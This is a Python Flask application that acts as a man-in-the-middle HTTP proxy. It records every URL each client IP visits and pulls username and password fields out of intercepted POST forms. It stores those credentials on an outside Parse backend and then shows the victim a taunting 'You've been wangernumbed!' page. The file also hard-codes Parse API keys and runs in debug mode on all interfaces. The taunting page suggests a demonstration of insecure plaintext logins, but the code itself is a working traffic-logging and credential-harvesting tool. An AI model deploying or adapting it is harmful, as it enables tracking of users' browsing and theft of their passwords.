import os
import re
import json
import requests
import random
from bs4 import BeautifulSoup
from flask import Flask, render_template, send_from_directory, abort, redirect, url_for, request, make_response, Response, stream_with_context, send_file, jsonify
import pyjade
from StringIO import StringIO

PARSE = "https://api.parse.com/1/"
CLASSES = "classes/"
CLIENT = "Client"
HEADERS = {'X-Parse-Application-Id': 'KNf3x2GGrkFOoRapY8D9y6PkrHKRPlk6FgeWblEF', 'X-Parse-REST-API-Key': 'NFhLdYkpllYLW2Ndw92G8jPx7PuZOgP6CjtqbaF8', 'Content-type': 'application/json'}

USERNAME = ['username', 'user', 'email', 'handle', 'uniqname', 'alias', 'account']
PASSWORD = ['password', 'pass', 'key', 'passkey', 'passphrase', 'secret']

app = Flask(__name__)
# use the jade template engine
app.jinja_env.add_extension('pyjade.ext.jinja.PyJadeExtension')

def get_client_obid(ip):
  params = {'where': json.dumps({'ip': ip})}
  r = requests.get(PARSE + CLASSES + CLIENT, headers=HEADERS, params=params)
  if (r.status_code != 404):
    data = json.loads(r.text)
    if (data.get('results', False)):
      return data['results'][0]['objectId']
  return new_client_from_ip(ip)

def new_client_from_ip(ip):
  data = json.dumps({'ip': ip})
  r = requests.post(PARSE + CLASSES + CLIENT, headers=HEADERS, data=data)
  if (r.status_code != 404):
    obj = json.loads(r.text)
    return obj.get('objectId', '')
  return None

def add_visited(ip, url):
  obid = get_client_obid(ip)
  if obid is None:
    print "Failed to get a Client object!"
    return
  data = json.dumps({"visited":{"__op":"AddUnique","objects":[url]}})
  r = requests.put(PARSE + CLASSES + CLIENT + '/' + obid, headers=HEADERS, data=data)
  if r.status_code == 404:
    print "Error adding visited: %s, %s" % (ip, url)
    print PARSE + CLASSES + CLIENT + '/' + obid
    print r.text
    return False
  return True

def store_credentials(ip, url, u, p):
  obid = get_client_obid(ip)
  if obid is None:
    return
  data = json.dumps({"credentials":{"__op":"AddUnique","objects":[(url, u, p)]}})
  r = requests.put(PARSE + CLASSES + CLIENT + '/' + obid, headers=HEADERS, data=data)
  return True

def insecure_login(form):
  for u in USERNAME:
    for p in PASSWORD:
      ups = [key for key in form.keys() if u in key]
      pws = [key for key in form.keys() if p in key]
      if ups and pws:
        # TODO: multiple handling?
        user = form[ups[0]]
        pasw = form[pws[0]]
        print "Insecure login detected: %s:%s" % (user, pasw)
        return (user, pasw)
  return (None, None)

def get_url(path):
  host = request.headers.get("Host")
  if path.startswith("http://"):
    return path
  return "http://%s/%s" % (host, path)

def simple_rr(url, ip, u=None, p=None):
  obj = {
    "title": "You've been wangernumbed!",
    "url": url,
    "ip": ip,
    "username": u,
    "password": p
  };
  return render_template('rr.jade', **obj)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET', 'POST'])
def catch_all(path):
  # log the request
  url = get_url(path)
  ip = request.remote_addr
  add_visited(ip, url)
  # print 'You want path: %s' % url
  # print request.method
  if url.startswith("http://www.nytimes.com"):
    return simple_rr(url, ip)
  if request.method == "POST":
    (u, p) = insecure_login(request.form)
    print "POST REQUEST: "
    print request.form
    if (u, p):
      store_credentials(ip, url, u, p)
      return simple_rr(url, ip, u, p)
    r = requests.post(url, data=dict(request.form))
  else:
    r = requests.get(url)
  return Response(stream_with_context(r.iter_content()), content_type = r.headers.get('content-type', "text/html"))

# this guy handles static files
# @app.route('/<path:filename>')
# def send_pic(filename):
#   print(path + filename)
#   if re.match(r'([^\s]+(\.(?i)(jpg|png|gif|bmp))$)', filename):
#     img = requests.get("http://lorempixel.com/400/400")
#     response = make_response(img.content)
#     response.headers['Content-Type'] = img.headers['Content-Type']
#     return response
#   return request.headers.get("User-Agent")
#   return send_from_directory('./public/', filename)

if __name__ == '__main__':
  # Bind to PORT if defined (on production)
  port = int(os.environ.get('PORT', 3000))
  
  app.run(host='0.0.0.0', port=port, debug=True, threaded=True)


